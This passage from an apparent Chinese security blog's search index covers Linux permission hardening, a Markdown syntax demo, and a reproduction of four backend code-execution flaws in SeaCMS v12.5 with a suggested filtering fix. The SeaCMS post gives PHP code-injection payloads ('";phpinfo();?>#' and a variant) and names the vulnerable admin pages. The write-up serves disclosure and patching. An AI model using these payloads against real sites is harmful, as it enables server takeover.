是什么意思呢，这个要三个三个的看，第一个rw-代表文件所有者对它的权限，第二个r--代表所有组对它的权限，第三个r--代表其他人对它的权限。这里的r（读）w（写）x（执行）分别对应数字4、2、1，-代表没有权限，这里这个文件的权限就是644。</code></pre><p>那么现在假设要加固我们的Web目录应该怎么写，最安全的办法就是大家都有只读权限，没有写跟执行权限，我们可以这么去执行命令：</p><pre class="line-numbers language-shell"><code class="language-shell">chmod 444 /var/www/html/*         #/var/www/html下所有文件权限改为只读（4）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>效果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200413225611135.png" alt="在这里插入图片描述"></p><p>还可以更改文件所有者，用chown命令</p><pre class="line-numbers language-shell"><code class="language-shell">chown admin /var/www/html/*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>效果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200413230255642.png" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>海洋CMSv12.5后台多处代码执行漏洞复现</title>
      <link href="/posts/1f383294.html"/>
      <url>/posts/1f383294.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>好久没有写博客了，最近痴迷于挖一些通用型的漏洞，从这篇开始会陆续复现一些我挖的，或者网上爆出来的漏洞。海洋CMS也是才更新不久，但是这个后台代码执行的洞迟迟不补。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210117201420470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>说出来你可能不信，一共有四处代码执行，被执行的文件分别是</p><ul><li>/data/admin/ip.php</li><li>/data/admin/notify.php</li><li>/data/admin/ping.php</li><li>/data/admin/weixin.php</li></ul><p>这四个文件前三个的exp相同，admin_weixin.php的exp需要稍微修改</p><p>来到admin_ip.php，这里漏洞的成因也很明显，传入的字符没有经过任何的过滤，直接被写入到文件里了。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210117201627716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因为是POST，所以我们抓个包，去闭合一下它写入到ip.php中的语句<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2021011720173856.png" alt="在这里插入图片描述"></p><p>再来看第二个文件admin_notify.php，代码从这里可以确认，代码确实是一个人写的哈哈哈<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210117201750288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>同样也是闭合一下语句，burp抓包改包去攻击，看一下notify.php这个文件<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210117201806364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再来看admin_ping.php<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210117201825240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还是抓包改包闭合语句，看一下ping.php<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210117201839849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后看一下admin_weixin.php<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210117201853216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>再来看一下weixin.php，这个闭合起来也没什么难度<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210117201915828.png" alt="在这里插入图片描述"></p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p><strong>通杀exp：”;phpinfo();?&gt;#</strong> </p><p>先来验证admin_ip.php，这里不需要抓包，直接POST提交即可：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2021011720214674.png" alt="在这里插入图片描述"></p><p>改完之后会立即执行：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210117202151546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>/data/admin/ip.php同样也会执行<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2021011720215919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再来看admin_notify.php，直接上通用exp：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210117202225326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功执行<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210117202241992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再看admin_ping.php，这里需要注意点击<strong>确认按钮</strong><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210117202300251.png" alt="在这里插入图片描述"></p><p>成功执行<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210117202310760.png" alt="在这里插入图片描述"></p><p>最后看一下admin_weixin.php，这里通杀exp要改一下，因为被写入文件定义的是常量，所以要加一个)来闭合</p><p><strong>Exp：”);phpinfo();?&gt;#</strong> ，直接插到最后那个输入框即可：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2021011720235622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功执行：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210117202410700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="临时修复"><a href="#临时修复" class="headerlink" title="临时修复"></a>临时修复</h3><p>临时修复我采用的是<strong>htmlspecialchars()</strong> 进行简单过滤，这里就不挨个去加固了，先加固admin_ip.php打个样吧</p><p>关键代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$v</span><span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'v'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>还是老样子，我们在输入框内插入exp：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2021011720251370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>确认后到ip.php看一下是否被过滤掉：</p><p>成功过滤~<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210117202537318.png" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 0day </tag>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Exp </tag>
            
            <tag> 代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小书匠测试</title>
      <link href="/posts/93b6de2c.html"/>
      <url>/posts/93b6de2c.html</url>
      
        <content type="html"><![CDATA[<p>[toc!?theme=gray&amp;depth=4]</p><h1 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h1><hr><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><pre class="line-numbers language-markdown"><code class="language-markdown">这是 <span class="token title important">H1 一级标题<span class="token punctuation">======</span></span>这是 <span class="token title important">H2 二级标题<span class="token punctuation">------</span></span><span class="token title important"><span class="token punctuation">#</span> 这是 H1 一级标题</span><span class="token title important"><span class="token punctuation">##</span> 这是 H2 二级标题</span><span class="token title important"><span class="token punctuation">###</span> 这是 H3 三级标题</span><span class="token title important"><span class="token punctuation">####</span> 这是 H4 四级标题</span><span class="token title important"><span class="token punctuation">#####</span> 这是 H5 五级标题</span><span class="token title important"><span class="token punctuation">######</span> 这是 H6 六级标题</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>快捷键</strong>: [ctrl + h]</p><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><pre class="line-numbers language-markdown"><code class="language-markdown"><span class="token list punctuation">*</span> 项目1  <span class="token list punctuation">*</span> 子项目1.1  <span class="token list punctuation">*</span> 子项目1.2<span class="token code keyword">    * 子项目1.2.1</span><span class="token list punctuation">*</span> 项目2<span class="token list punctuation">*</span> 项目3<span class="token list punctuation">+</span> 项目1  <span class="token list punctuation">+</span> 子项目1.1  <span class="token list punctuation">+</span> 子项目1.2<span class="token code keyword">    + 子项目1.2.1</span><span class="token list punctuation">+</span> 项目2<span class="token list punctuation">+</span> 项目3<span class="token list punctuation">-</span> 项目1  <span class="token list punctuation">-</span> 子项目1.1  <span class="token list punctuation">-</span> 子项目1.2<span class="token code keyword">    - 子项目1.2.1</span><span class="token list punctuation">-</span> 项目2<span class="token list punctuation">-</span> 项目3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>快捷键</strong>: [ctrl + u]</p><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><pre class="line-numbers language-markdown"><code class="language-markdown"><span class="token list punctuation">1.</span> 项目1<span class="token list punctuation">2.</span> 项目2<span class="token list punctuation">3.</span> 项目3<span class="token code keyword">    1. 项目3.1</span><span class="token code keyword">    2. 项目3.2</span><span class="token list punctuation">1.</span> 项目1<span class="token list punctuation">1.</span> 项目2<span class="token list punctuation">1.</span> 项目3<span class="token code keyword">    1. 项目3.1</span><span class="token code keyword">    1. 项目3.2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="有序列表起始编号"><a href="#有序列表起始编号" class="headerlink" title="有序列表起始编号"></a>有序列表起始编号</h3><pre class="line-numbers language-markdown"><code class="language-markdown"><span class="token list punctuation">58.</span> 项目5<span class="token list punctuation">2.</span> 项目6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>快捷键</strong>: [ctrl + o]</p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><pre class="line-numbers language-markdown"><code class="language-markdown"><span class="token url">[链接名称](链接地址)</span><span class="token url">[链接名称][<span class="token variable">1</span>]</span>[1] : 链接地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><pre class="line-numbers language-markdown"><code class="language-markdown"><span class="token url">![名称](链接地址)</span><span class="token url">![名称][<span class="token variable">1</span>]</span>[1] : 链接地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="文字格式"><a href="#文字格式" class="headerlink" title="文字格式"></a>文字格式</h2><pre class="line-numbers language-markdown"><code class="language-markdown"><span class="token bold"><span class="token punctuation">**</span>这是文字粗体格式<span class="token punctuation">**</span></span><span class="token bold"><span class="token punctuation">__</span>这是文字粗体格式<span class="token punctuation">__</span></span><span class="token italic"><span class="token punctuation">*</span>这是文字斜体格式<span class="token punctuation">*</span></span><span class="token italic"><span class="token punctuation">_</span>这是文字斜体格式<span class="token punctuation">_</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><pre class="line-numbers language-markdown"><code class="language-markdown"><span class="token blockquote punctuation">></span> 第一行引用文字<span class="token blockquote punctuation">></span> 第二行引用文字<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="水平线"><a href="#水平线" class="headerlink" title="水平线"></a>水平线</h2><pre class="line-numbers language-markdown"><code class="language-markdown"><span class="token hr punctuation">***</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="GFM扩展语法"><a href="#GFM扩展语法" class="headerlink" title="GFM扩展语法"></a>GFM扩展语法</h1><hr><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><pre class="line-numbers language-markdown"><code class="language-markdown"><span class="token title important">First Header  | Second Header<span class="token punctuation">-------------</span></span> | -------------Content Cell  | Content CellContent Cell  | Content Cell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="增强型表格"><a href="#增强型表格" class="headerlink" title="增强型表格"></a>增强型表格</h2><pre class="line-numbers language-markdown"><code class="language-markdown">|First Header  | Second Header |||First Header  | Second Header | Third Header||------------- | -------------|-------------|表身1Content Cell  | Merge Content Cell||Content Cell  | Content Cell| Content Cell|表身2Content Cell  | Merge Content Cell||Content Cell  | Content Cell| Content Cell|[表格标题]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="行内代码"><a href="#行内代码" class="headerlink" title="行内代码"></a>行内代码</h3><pre class="line-numbers language-markdown"><code class="language-markdown"><span class="token code keyword">`var x = "hello world"`</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="块代码"><a href="#块代码" class="headerlink" title="块代码"></a>块代码</h3><pre class="line-numbers language-markdown"><code class="language-markdown">```javascriptvar a = "hello world";var b = "good luck";```<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="自动转换成超链接"><a href="#自动转换成超链接" class="headerlink" title="自动转换成超链接"></a>自动转换成超链接</h2><p>系统将自动根据内容，将地址转换成超链接格式</p><pre class="line-numbers language-markdown"><code class="language-markdown">http://markdown.xiaoshujiang.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><pre class="line-numbers language-markdown"><code class="language-markdown"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hey<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Hello world<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://github.com/github/markup/tree/master#html-sanitization" target="_blank" rel="noopener">支持的html标签</a></p><h2 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h2><pre class="line-numbers language-markdown"><code class="language-markdown">~~在文字上添加删除线~~<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="扩展语法"><a href="#扩展语法" class="headerlink" title="扩展语法"></a>扩展语法</h1><hr><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><pre class="line-numbers language-markdown"><code class="language-markdown">[toc]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="扩展的文字格式"><a href="#扩展的文字格式" class="headerlink" title="扩展的文字格式"></a>扩展的文字格式</h2><pre class="line-numbers language-markdown"><code class="language-markdown">++插入的文字++==被记号的文字==上角文字: 19^th^下角文字: H~2~O<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="印刷字替换"><a href="#印刷字替换" class="headerlink" title="印刷字替换"></a>印刷字替换</h2><p>系统将自动替换下列文字，转换成排版系统使用的符号</p><pre class="line-numbers language-markdown"><code class="language-markdown">(c) (C) (r) (R) (tm) (TM) (p) (P) +-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="缩写定义"><a href="#缩写定义" class="headerlink" title="缩写定义"></a>缩写定义</h2><pre class="line-numbers language-markdown"><code class="language-markdown">The HTML specificationis maintained by the W3C.*<span class="token url-reference url"><span class="token punctuation">[</span><span class="token variable">HTML</span><span class="token punctuation">]</span><span class="token punctuation">:</span> Hyper</span> Text Markup Language*<span class="token url-reference url"><span class="token punctuation">[</span><span class="token variable">W3C</span><span class="token punctuation">]</span><span class="token punctuation">:</span>  World</span> Wide Web Consortium<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="待办事项"><a href="#待办事项" class="headerlink" title="待办事项"></a>待办事项</h2><pre class="line-numbers language-markdown"><code class="language-markdown"><span class="token list punctuation">-</span> [ ] 未完成事项<span class="token list punctuation">-</span> [ ] 未完成事项<span class="token list punctuation">-</span> [x] 完成事项<span class="token list punctuation">-</span> [X] 完成事项<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h2><pre class="line-numbers language-markdown"><code class="language-markdown">脚注[^1x]<span class="token url-reference url"><span class="token punctuation">[</span><span class="token variable">^1x</span><span class="token punctuation">]</span><span class="token punctuation">:</span> 脚注的用法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><pre class="line-numbers language-markdown"><code class="language-markdown">苹果: 一种水果: 一种品牌，计算机，手持设备桔子: 一种水果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h2><h3 id="行内公式"><a href="#行内公式" class="headerlink" title="行内公式"></a>行内公式</h3><pre class="line-numbers language-markdown"><code class="language-markdown">这是行内公式<span class="token code keyword">`!$ \Gamma(z) = \int_0^\infty t^{z-1}e^{-t}dt\,. $`</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="块公式"><a href="#块公式" class="headerlink" title="块公式"></a>块公式</h3><pre class="line-numbers language-markdown"><code class="language-markdown">```mathjax!$$\Gamma(z) = \int_0^\infty t^{z-1}e^{-t}dt\,.$$```<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="流程图-语法"><a href="#流程图-语法" class="headerlink" title="流程图 (语法)"></a>流程图 (<a href="http://adrai.github.io/flowchart.js/" target="_blank" rel="noopener">语法</a>)</h3><pre class="line-numbers language-markdown"><code class="language-markdown">```flowst=>start: 开始e=>end: 结束op=>operation: 操作步骤cond=>condition: 是 或者 否?st->op->condcond(yes)->econd(no)->op```<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="序列图-语法"><a href="#序列图-语法" class="headerlink" title="序列图 (语法)"></a>序列图 (<a href="https://github.com/bramp/js-sequence-diagrams/blob/master/src/grammar.jison" target="_blank" rel="noopener">语法</a>)</h3><pre class="line-numbers language-markdown"><code class="language-markdown">```sequence小明->小李: 你好 小李, 最近怎么样?Note right of 小李: 小李想了想小李-->小明: 还是老样子```<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="小书匠编辑器扩展语法"><a href="#小书匠编辑器扩展语法" class="headerlink" title="小书匠编辑器扩展语法"></a>小书匠编辑器扩展语法</h1><hr><h2 id="块代码内文字格式"><a href="#块代码内文字格式" class="headerlink" title="块代码内文字格式"></a>块代码内文字格式</h2><h3 id="块代码高亮标记"><a href="#块代码高亮标记" class="headerlink" title="块代码高亮标记"></a>块代码高亮标记</h3><pre class="line-numbers language-markdown"><code class="language-markdown">```javascriptvar >>==hello==&lt;&lt; = 'hello world'```<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="块代码删除线"><a href="#块代码删除线" class="headerlink" title="块代码删除线"></a>块代码删除线</h3><pre class="line-numbers language-markdown"><code class="language-markdown">```javascriptvar >>~~hello~~&lt;&lt; = 'hello world'```<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="块代码加粗"><a href="#块代码加粗" class="headerlink" title="块代码加粗"></a>块代码加粗</h3><pre class="line-numbers language-markdown"><code class="language-markdown">```javascriptvar >><span class="token bold"><span class="token punctuation">**</span>hello<span class="token punctuation">**</span></span>&lt;&lt; = 'hello world'```<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="块代码下横线"><a href="#块代码下横线" class="headerlink" title="块代码下横线"></a>块代码下横线</h3><pre class="line-numbers language-markdown"><code class="language-markdown">```javascriptvar >>++hello++&lt;&lt; = 'hello world'```<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>小书匠编辑器提供了附件管理功能，用户可通过<code>./</code>对附件的引用，比如图片<code>./jiangzhu.jpg</code>。附件的上传需通过工具栏的插入图片<code>ctrl+g</code>，插入视频<code>ctrl+shift+v</code>，插入音频<code>ctrl+shift+a</code>，插入附件<code>ctrl+shift+t</code>功能键进行操作。</p><h2 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h2><pre class="line-numbers language-markdown"><code class="language-markdown">%<span class="token url">[名称](链接地址)</span>%<span class="token url">[名称][<span class="token variable">1</span>]</span>[1] : 链接地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h2><pre class="line-numbers language-markdown"><code class="language-markdown">~<span class="token url">[名称](链接地址)</span>~<span class="token url">[名称][<span class="token variable">1</span>]</span>[1] : 链接地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><pre class="line-numbers language-markdown"><code class="language-markdown">=<span class="token url">[名称](链接地址)</span>=<span class="token url">[名称][<span class="token variable">1</span>]</span>[1] : 链接地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a>元数据</h2><p>元数据必须放置在每篇文章的开头才能生效。如果文章里有元数据时，系统将自动以元数据的标题为准，用户通过文章信息的维护界面修改的标题及tags将会被覆盖掉。</p><pre class="line-numbers language-markdown"><code class="language-markdown"><span class="token hr punctuation">---</span>title: 小书匠语法使用手册<span class="token title important">tags: 小书匠,语法,MARKDOWN,帮助<span class="token punctuation">---</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="mermaid流程图，序列图，甘特图（mermaid语法）"><a href="#mermaid流程图，序列图，甘特图（mermaid语法）" class="headerlink" title="mermaid流程图，序列图，甘特图（mermaid语法）"></a>mermaid流程图，序列图，甘特图（<a href="http://knsv.github.io/mermaid/index.html" target="_blank" rel="noopener">mermaid语法</a>）</h2><pre class="line-numbers language-markdown"><code class="language-markdown">```mermaid!graph TD;A-->B;A-->C;B-->D;C-->D;```<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="统计图-（统计图语法）"><a href="#统计图-（统计图语法）" class="headerlink" title="统计图 （统计图语法）"></a>统计图 （<a href="https://github.com/flot/flot/blob/master/API.md" target="_blank" rel="noopener">统计图语法</a>）</h2><p>数据格式为：<code>{"data": [], "options":{}}</code><br>系统使用<a href="http://api.jquery.com/jquery.parsejson/" target="_blank" rel="noopener">jquery.parseJSON()</a>函数进行解析，因此代码必须符合该函数的要求才能正常解析。</p><pre class="line-numbers language-markdown"><code class="language-markdown">```plot!{"data": [ [[0, 0], [1, 1]] ],"options": { "yaxis": { "max": 1 } }}```<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="自定义class"><a href="#自定义class" 